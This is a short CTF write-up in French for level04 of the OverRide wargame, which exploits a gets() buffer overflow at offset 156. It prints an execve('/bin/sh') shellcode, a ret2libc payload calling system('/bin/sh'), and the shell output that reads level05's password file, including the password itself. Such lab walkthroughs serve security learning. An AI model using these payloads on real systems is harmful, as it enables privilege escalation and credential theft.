En desassemblant le code et en faisant un peu de calcul on se rend compte qu'il y a un buffer de 144 et que l'on peu réecrire EIP a 156 octets de décalage au moment de l'appel a gets 144 + 12 (REGISTRES)

On tente un shellcode.

```bash
export SC=$(python -c "print('\x90' * 42 + '\x31\xc0\x31\xd2\x31\xdb\x31\xc9\x68\x2f\x73\x68\x31\x80\x74\x24\x03\x31\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80')")
```

On récupere l'adresse de notre shellcode -> 0xffffdea7

En tentant cette technique on est bloqué par ptrace qui ne nous laisse pas executer de shell

```bash
level04@OverRide:~$ python -c "print('B' * 156 + '\xa7\xde\xff\xff')" | ./level04
Give me some shellcode, k
no exec() for you
level04@OverRide:~$
```
On va essayer la methode de ret2libC

On récupere l'adresse de:

system -> 0xf7e6aed0
"/bin/sh" -> 0xf7f897ec

Maintenant on réecris la stack pour appeler system("/bin/sh").

```bash
level04@OverRide:~$ python -c "print('B' * 156 + '\xd0\xae\xe6\xf7' + 'BBBB' + '\xec\x97\xf8\xf7')" > /tmp/level04.txt
level04@OverRide:~$ cat /tmp/level04.txt - | ./level04
Give me some shellcode, k
id
uid=1004(level04) gid=1004(level04) euid=1005(level05) egid=100(users) groups=1005(level05),100(users),1004(level04)
cat /home/users/level05/.pass
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

